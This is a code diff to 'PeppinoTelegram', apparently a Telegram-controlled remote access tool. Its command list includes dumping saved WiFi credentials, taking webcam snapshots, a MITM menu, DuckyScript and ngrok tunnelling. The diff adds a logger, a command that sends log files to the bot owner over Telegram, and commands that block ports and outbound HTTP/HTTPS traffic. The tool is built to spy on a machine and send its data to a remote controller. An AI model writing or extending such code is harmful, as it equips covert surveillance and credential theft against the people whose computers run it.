@@ -82,7 +82,7 @@ def load_dll(name: str) -> None:
 
 
 # CONSTANTS
-logging = False
+logging = True
 iswindows = name == "nt"
 islinux = not iswindows
 cwd_folder = getcwd()
@@ -328,7 +328,7 @@ o888o  o888o  `Y8bood8P'  o888o        `Y8bod8P'  888bod8P'
                                                  o888o
 """
 class PeppinoTelegram:
-    def __init__(self, token: str, owner_id: int, ngrok_token: str, mixer: CustomMixer, capture: VideoCapture, loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]], signal_error: str|None = None, tunnel_provider: str="ngrok") -> None:
+    def __init__(self, token: str, owner_id: int, ngrok_token: str, mixer: CustomMixer, capture: VideoCapture, logger,  loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]], signal_error: str|None = None, tunnel_provider: str="ngrok") -> None:
         self.token = token
         self.owner_id = owner_id
         self.ngrok_token = ngrok_token
@@ -336,6 +336,7 @@ class PeppinoTelegram:
         self.tunnelhandler = TunnelManager(tunnel_provider)
         self.tunnel_provider = tunnel_provider
         self.has_admin = is_admin()
+        self.logger = logger
 
         # Need to add this one so someone who spams my bot won't spam me
         self.strangers : list[int] = []
@@ -413,6 +414,7 @@ class PeppinoTelegram:
             Command("menu_misc", self.menu_misc, "Open Misc menu.", "🏠 Menu", "🦑 Misc"),
             Command("menu_mitm", self.menu_mitm, "Open MITM menu.", "🏠 Menu", "🕵️‍♂️ MITM"),
             Command("menu_plugins", self.menu_plugins, "Open Plugins menu.", "🏠 Menu", "🔌 Your Plugins"),
+            Command("menu_utilities", self.menu_utilities, "Open Utilities Menu", "🏠 Menu", "🔧 Utility"),
             Command("menu_duckyscript", self.menu_ducky, "Opens ducky quick keys.", "🏠 Menu", "🦆 DuckyScript"),
             
             # 🛑 System & Shutdown
@@ -427,6 +429,9 @@ class PeppinoTelegram:
             Command("wifiinfo", self.wifiinfo, "Show saved WiFi credentials.", "🌐 Network", "📶 Wifiinfo"),
             Command("getip", self.getip, "Get public IP and location.", "🌐 Network", "🌐 Get IP"),
             Command("urltoast", notify_toast, "Show Windows toast with URL.", "🌐 Network", "🔗 URL Toast"),
+            Command("block_port", self.block_port, "Block a specific TCP/UDP port.", "🌐 Network", "🚫 Block Port"),
+            Command("block_http", self.block_http, "Block all outbound HTTP traffic (port 80).", "🌐 Network", "🚫 Block HTTP"),
+            Command("block_https", self.block_https, "Block all outbound HTTPS traffic (port 443).", "🌐 Network", "🚫 Block HTTPS"),
 
             # 📸 Camera & Screen
             Command("selfie", self.selfie, "Take webcam photo.", "📸 Camera", "🤳 Webcam Snapshot"),
@@ -540,6 +545,7 @@ class PeppinoTelegram:
             Command("block_https", self.block_https, "Blocks traffic on a specific port.", "🕵️‍♂️ MITM", "Block HTTPS"),
 
             # 🔧 Utilities & Testing
+            Command("get_logs", self.get_logs, "Gets the program logs ins a file", "🔧 Utility", "📄 Get Logs"),
             Command("stop", self.stop, "Stop current operation.", "🔧 Utility", "🛑 Stop"),
             Command("test", self.test, "Run test routine.", "🔧 Utility", "🧪 Test"),
             Command("help", lambda: self.bsend(self.help), "Show help menu.", "🔧 Utility", "❓ Help"),
@@ -927,6 +933,19 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         output = get_public_ip()
         self.bsend(f"🌐 Public IP: {output}")
 
+    def get_logs(self):
+        try:
+            if self.logger:
+                fname = f"{randomname()}.log"
+                logs = self.logger.get_logs()
+                if not logs:
+                    self.bsend("No logs")
+                    return
+                file = craft_file(logs, fname)
+                self.bot.sendDocument(self.owner_id, file)
+                remove(fname)
+        except Exception as e:
+            self.bsend(f"Exception while sending logs: \n{e}")
 
     def get_disk_info(self):
         disks = get_disk_info()
@@ -1154,6 +1173,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             ("🦆 DuckyScript", "🦆 DuckyScript", "/menu_duckyscript"),
             ("🕵️‍♂️ Mitm", "🕵️‍♂️ Mitm", "/menu_mitm"),
             ("🔌 PlugIns", "🔌 Your Plugins", "/menu_plugins"),
+            ("🔧 Utility","🔧 Utility", "/menu_utilities"),
         ]:
             buttons[label] = submenu
 
@@ -1205,6 +1225,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def menu_system(self):
         return self.generate_category_menu("🛑 System", "🛑 System & Shutdown")
+
+    def menu_utilities(self):
+        return self.generate_category_menu("🔧 Utility", "🔧 Utility")
 
     def menu_network(self):
         return self.generate_category_menu("🌐 Network", "🌐 Network & Remote Access")
@@ -2246,11 +2269,20 @@ if __name__ == "__main__":
     try:
         token, chat_id, ngrok_token, tunnel_provider = getCred() 
     except Exception as e:
+        sys.exit()
+        """
+        # If there is an error with the credentials this is the only way of knowing it
         with open(join(gettempdir(), "PEP2log.log"), "w") as fo:
             fo.write(traceback.format_exc())
             fo.write(str(e))
+        """
     mixer = CustomMixer()
     capture = VideoCapture(0)
+    if logging:
+        logger = DebugLogger()
+        logger.activate()
+    else:
+        logger = None
     signal_error = ""
     if tunnel_provider == "ngrok":
         try:
@@ -2268,7 +2300,9 @@ if __name__ == "__main__":
         except Exception as e:
             signal_error += f"Unhandled exception: {e}\n"
 
-    pep2 = PeppinoTelegram(token,chat_id,ngrok_token,mixer,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"], tunnel_provider="ngrok" if ngrok_token and tunnel_provider=="ngrok" else "localtunnel")
+    pep2 = PeppinoTelegram(token,chat_id,ngrok_token,mixer,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"], tunnel_provider="ngrok" if ngrok_token and tunnel_provider=="ngrok" else "localtunnel", logger=logger)
+
+    # Use only if developer
     if GENERATE_COMMANDS_MD:
         try:
             import update_commandsMD
